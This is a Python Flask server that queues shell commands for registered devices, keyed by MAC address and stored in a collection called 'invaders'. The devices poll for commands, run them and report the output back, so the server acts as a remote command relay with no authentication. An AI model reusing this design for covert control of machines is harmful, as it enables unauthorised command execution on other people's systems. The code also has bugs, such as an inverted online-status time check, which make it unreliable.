#!/home/yogi/flaskk/yogi/bin/python

from flask import Flask, request, jsonify, url_for, redirect
from datetime import datetime, timedelta
import random
from database import Database
from pretty import Pretty, statuss
from commands import Commands

app = Flask(__name__)
Database.initialize()
ro = [
    {'mac': 'abcd',
     'commands': [{'token': 1234, 'serve': 'true', 'command': 'pwd', 'tag': 'false', 'response': ''}]
     },
    {'mac': 'efgh',
     'commands': [{'token': 1234, 'serve': 'true', 'command': 'ls -l', 'tag': 'false', 'response': ''}]
     }
]
print(ro)


@app.route('/store', methods=['POST'])
def hello():
    request_data = request.get_json()
    data = Database.find_one('invaders', {'mac': request_data['mac']})

    if data is not None:
        Database.update('invaders', query={'mac': request_data['mac']}, data={"$set": {'reporte': datetime.now()}})
        if 'token' in request_data:
            base = Database.find_one('invaders', {'mac': request_data['mac'], 'commands.token': request_data['token']})
            if base is not None:
                Database.update('invaders',
                    query= {'mac': request_data['mac'], 'commands.token': request_data['token']},
                    data= {"$set": {"commands.$.response": request_data['response']}})
                Database.update('invaders',
                    query= {'mac': request_data['mac'], 'commands.token': request_data['token']},
                    data= {"$set": {"commands.$.tag": 'true'}})

        requeste = {'mac': request_data['mac']}
        print(request_data['mac'])
        rev = Database.find_one('invaders', {'mac': request_data['mac'], 'commands.serve': 'true'})

        if rev is not None:
            randie = rev['commands']
            print(randie)
            for i in randie:
                if i['serve'] == 'true':
                    rrr = i['token']
                    jjj = i['command']
                    print(rrr)
                    print(jjj)
                    requeste = {'mac': rev['mac'], 'token': rrr, 'command': jjj}
                    Database.update('invaders',
                        query= {'mac': rev['mac'], 'commands.token': i['token']},
                        data= {"$set": {"commands.$.serve": 'mild'}})
                    break
        print(requeste)
        return jsonify(requeste)

    # if 'token' in request_data:
    #     for i in ro:
    #         if i['mac'] == request_data['mac']:
    #             for j in i['commands']:
    #                 if j['token'] == request_data['token']:
    #                     j['response'] = request_data['response']
    #                     j['tag'] = 'true'
    #     request_data = {'mac': request_data['mac']}
    #
    # for i in ro:
    #     print("start")
    #     print(request_data['mac'])
    #     if i['mac'] == request_data['mac']:
    #         print('finish')
    #         for j in i['commands']:
    #             if j['serve'] == 'true':
    #                 rrr = j['token']
    #                 jjj = j['command']
    #                 print(rrr)
    #                 print(jjj)
    #                 request_data = {'mac': i['mac'], 'token': rrr, 'command': jjj}
    #                 j['serve'] = 'mild'
    #                 break
    #         break
    #
    # print(request_data)
    # print(ro)
    # return jsonify(request_data)


@app.route('/store/<string:mac>', methods=['POST'])  # { 'command': "ls -l" }
def exec(mac):
    request_data = request.get_json()

    data = Database.find_one('invaders', {'mac': mac})
    if data is not None:
        rand = random.randint(1000, 9999)
        print(rand)
        statuse = statuss(data)
        print(statuse)
        if statuse:
            print('url_for is working')
            josn = Commands(mac=mac, token=rand, serve='true', command=request_data['command'], tag='false', response='')
            josn.save_to_mongo()
        else:
            return jsonify({'output': 'router is offline'})

        a = datetime.now()
        b = timedelta(seconds=30)
        c = a + b
        while datetime.now() < c:
            r = Database.find_one('invaders', {'mac': mac, 'commands.token': rand, 'commands.tag': 'true'})
            randie = r['commands']
            for i in randie:
                if i['token'] == rand and i['tag'] == 'true':
                    response = i['response']
                    print('horrible')
                    print(response)
                    Database.update('invaders', query={'mac': mac},
                                    data={'$pull': {'commands': {'token': rand}}})
                    return jsonify(response)


            # while r is not None:
            #     print(r['mac'])
            #     randie = r['commands']
            #     for i in randie:
            #         if i['token'] == rand:
            #             response = i['response']
            #             print('horrible')
            #             print(response)
            #             Database.update('invaders',query={'mac': mac}, data= {'$pull': {'commands': {'token': rand}}})
            #             return jsonify(response)
        #
        Database.update('invaders',query= {'mac': mac}, data= {'$pull': {'commands': {'token': rand}}})
        print('server timeout for' + str(rand))
        return jsonify({'output': 'server time out or server busy'})
    return jsonify({'output': 'unable to find with that mac'})

    # for i in ro:
    #     if i['mac'] == mac:
    #         rand = random.randint(1000, 9999)
    #         print(rand)
    #         josn = {'token': rand, 'serve': 'true', 'command': request_data['command'], 'tag': 'false', 'response': ''}
    #         i['commands'].append(josn)
    #         print(ro)
    #
    # for i in ro:
    #     if i['mac'] == mac:
    #         for j in i['commands']:
    #             if j['token'] == rand:
    #                 a = datetime.now()
    #                 b = timedelta(seconds=30)
    #                 c = a + b
    #                 while datetime.now() < c:
    #                     while not j['tag'] == 'false':
    #                         response = j['response']
    #                         print('yogi')
    #                         print(ro)
    #                         i['commands'].remove(j)
    #                         return jsonify(response)  # ({'output': response})
    #                 i['commands'].remove(j)
    #                 print(ro)
    #                 return jsonify({'output': 'server time out or server busy'})


# return {"ip": "192.168.1.1", "up": "25","down": "30"}


@app.route('/wheel/<string:mac>', methods=['POST'])  # adding new mac if doesn't exists
def registerpost(mac):
    data = Database.find_one('invaders', {'mac': mac})
    if data is not None:
        return {"message": "Already exists"}
    doc = Pretty(mac=mac)
    doc.save_to_mongo()
    return {"message": "success"}


@app.route('/wheel/<string:mac>', methods=['GET'])  # checks for a mac if exists or not
def registerget(mac):
    data = Database.find_one('invaders', {'mac': mac})
    if data is not None:
        print(data['mac'])
        #randie = data['commands']
        # for i in randie:
        #     print(i)
        return {"message": "Exists"}
    return {"message": "MAC Doesn't Exists or not registered"}


@app.route('/wheel/status/<string:mac>', methods=['GET'])    # checks against mac for offline or online
def status(mac):
    data = Database.find_one('invaders', {'mac': mac})
    if data is not None:
        deadline = 60
        print(data['mac'])
        print(data['reporte'])
        d = data['reporte']
        e = datetime.now()
        f = d-e
        g = int(f.total_seconds())
        if g<=deadline:
            return True
        else:
            return False
    return {"message": "MAC Doesn't Exists or not registered"}



if __name__ == '__main__':
    app.run(host='0.0.0.0')
